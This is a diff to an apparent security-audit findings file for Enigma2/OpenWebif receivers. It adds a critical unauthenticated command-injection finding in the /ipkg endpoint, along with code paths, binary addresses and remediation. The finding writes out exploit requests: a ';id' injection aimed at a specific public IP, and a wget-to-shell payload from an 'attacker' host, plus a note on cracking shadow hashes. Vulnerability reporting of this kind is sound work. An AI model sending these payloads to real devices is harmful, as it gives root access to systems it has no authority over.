@@ -21,6 +21,9 @@ FINDINGS SUMMARY:
   E2-F04 (MEDIUM/6.5)    Auth disabled by default: ConfigYesNo(default=False)
   E2-F05 (MEDIUM/5.3)    eval() in getConfigs() reads server-side XML (not direct user input)
   E2-F06 (INFO)          Moshi-Moshi FTP: custom Twisted server, TVFS, source unlocated
+  E2-F07 (CRITICAL/9.8)  Command injection: /ipkg?command=install&package=<INJECTION>
+                          eConsoleAppContainer.execute() → execvp("/bin/sh",["/bin/sh","-c",cmd])
+                          package= param directly concatenated into shell command, no sanitization
 
 BINARY RE FINDINGS (enigma2 C binary, ARM32):
   E2-BIN-F01 (MEDIUM/5.0) Unbounded strcpy into 4KB stack at 0x25eca8 (service dispatcher)
@@ -30,8 +33,9 @@ PLT MAP (12-byte stubs, base 0x78d20):
   sprintf (0x7a688): 248 callers — 245 literal fmt, 3 dynamic; format-string injection ruled out
   strcpy  (0x79ec0): 229 callers — 12 dynamic src; traced to internal device state
   memcpy  (0x79c44): 220 callers
-  system  (0x7a724): 1 caller (0x261a10) — DVB CI only, dead from network
-  execvp  (0x79200): 3 callers — stack-built fixed commands
+  system  (0x7a0a0): 3 callers — shutdown mechanism (/var/volatile/.eshutdown.sh <state> &), not injectable
+  execvp  (0x790c8): 1 caller (0x83f24) — eConsoleAppContainer.execute() Python C binding
+                     argv: ["/bin/sh", "-c", cmd_from_python, NULL] — confirmed shell exec path
 """
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -720,5 +724,101 @@ E2_BIN_F02_SYSTEM_DVB_CI = {
         "Unreachable from network. The DVB CI/CAM handler is triggered by physical "
         "hardware events (CAM module insertion / APDU exchange), not by HTTP requests. "
         "Even if r6 were user-controlled, there is no network path to this function."
+    ),
+}
+
+# ──────────────────────────────────────────────────────────────────────────────
+# FINDING E2-F07: Command injection in /ipkg endpoint
+# ──────────────────────────────────────────────────────────────────────────────
+
+E2_F07_IPKG_CMD_INJECTION = {
+    "finding_id": "E2-F07",
+    "severity": "CRITICAL",
+    "cvss_v3": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "status": "CONFIRMED",
+    "title": "OpenWebif /ipkg endpoint: command injection via package= parameter",
+    "component": "OpenWebif controllers/ipkg.py — IpkgController.CallOPKG()",
+    "source_path": "/usr/lib/enigma2/python/Plugins/Extensions/OpenWebif/controllers/ipkg.py",
+    "route": "/ipkg",
+    "auth_required": False,
+    "auth_note": "Auth disabled by default (E2-F04). /ipkg is registered under AuthResource but default auth=False.",
+    "vulnerable_code": (
+        "# Line 112-114:\n"
+        "cmd = '/usr/bin/opkg ' + action + force\n"
+        "for par in parms:         # parms = [request.args['package'][0]]\n"
+        "    cmd += par + ' '\n"
+        "# Line 126:\n"
+        "self.container.execute(cmd)  # eConsoleAppContainer.execute()"
+    ),
+    "data_flow": (
+        "HTTP request.args['package'][0] → pack (str)\n"
+        "→ CallOPKGP(request, action, pack) → CallOPKG(request, action, [pack])\n"
+        "→ cmd = '/usr/bin/opkg ' + action + ' ' + pack + ' '\n"
+        "→ eConsoleAppContainer.execute(cmd)\n"
+        "→ (C binary fn@0x856ac) → fn@0x8539c → fn@0x83d50\n"
+        "→ execvp('/bin/sh', ['/bin/sh', '-c', cmd, NULL])"
+    ),
+    "binary_evidence": {
+        "execvp_call_site": "0x00083f24",
+        "execvp_plt": "0x000790c8",
+        "shell_path_literal_va": "0x00262e26",
+        "shell_path_string": "/bin/sh",
+        "dash_c_literal_va": "0x00262e2e",
+        "dash_c_string": "-c",
+        "argv_construction_va": "0x00085648",
+        "argv": "['/bin/sh', '-c', eConsoleCmd, NULL]",
+        "eConsole_binding_va": "0x000856ac",
+    },
+    "exploit_path": (
+        "GET /ipkg?command=install&package=;id HTTP/1.1\n"
+        "Host: 82.84.145.15\n\n"
+        "Resulting cmd: '/usr/bin/opkg install  ;id '\n"
+        "Shell executes: '/usr/bin/opkg install' (fails), then 'id' as root"
+    ),
+    "exploit_rce_example": (
+        "GET /ipkg?command=install&package=;wget+-O-+http://attacker/shell.sh|sh HTTP/1.1\n"
+        "→ downloads and executes attacker-controlled shell script as root"
+    ),
+    "sanitization": "NONE — package parameter is appended verbatim to shell command string",
+    "affected_actions": ["install", "remove", "info", "status"],
+    "chain_context": (
+        "Simpler RCE path than E2-CHAIN-1. No credential brute-force or FTP needed.\n"
+        "E2-F04 (auth=False default) → E2-F07 = unauthenticated RCE as root.\n"
+        "Even with auth enabled, E2-F01 (/web/getipv6 bypass) does not help here;\n"
+        "but E2-F07 alone is sufficient when auth is enabled by reading shadow via\n"
+        "E2-F02 (file read) + hash crack → authenticated /ipkg access."
+    ),
+    "remediation": (
+        "1. Sanitize the package parameter: whitelist `[a-zA-Z0-9._+-]` only.\n"
+        "2. Use execvp directly (avoid shell): construct argv list without shell.\n"
+        "3. Pass args as separate list elements to eConsoleAppContainer, not concatenated string."
+    ),
+}
+
+# ──────────────────────────────────────────────────────────────────────────────
+# SYSTEM() CALL INVESTIGATION: 0x90238 / 0x90284 — SHUTDOWN MECHANISM (NOT INJECTABLE)
+# ──────────────────────────────────────────────────────────────────────────────
+
+E2_BIN_SYSTEM_SHUTDOWN_ANALYSIS = {
+    "title": "system() at 0x90284 — enigma2 shutdown mechanism, not injectable",
+    "call_site_va": "0x00090284",
+    "format_string": "%s %i &",
+    "format_string_va": "0x0026473d",
+    "arg_r2_source": "BSS 0x32184c — pointer to shutdown script path (set at runtime)",
+    "arg_r3_source": "BSS 0x300bc0 — shutdown state integer (1=halt, 2=reboot, 4=update-reboot)",
+    "next_rodata_string": "/var/volatile/.eshutdown.sh",
+    "conclusion": (
+        "The command string at *0x32184c is the fixed runtime path '/var/volatile/.eshutdown.sh'. "
+        "The integer at *0x300bc0 is a shutdown mode code (1/2/4) set by setPowerState() "
+        "in OpenWebif models/control.py → session.open(TryQuitMainloop, state). "
+        "Neither argument is user-controllable as an injectable string. "
+        "The shell script at 0x2644d8 handles states 1 (halt), 2 (reboot), 4 (opkg-update+reboot). "
+        "Not a vulnerability."
+    ),
+    "execvp_vs_system_confusion": (
+        "Prior session incorrectly attributed execvp callers to this function. "
+        "Corrected: execvp at 0x83f24 is in eConsoleAppContainer (E2-F07 path). "
+        "system() at 0x90284 is the shutdown mechanism. These are separate code paths."
     ),
 }
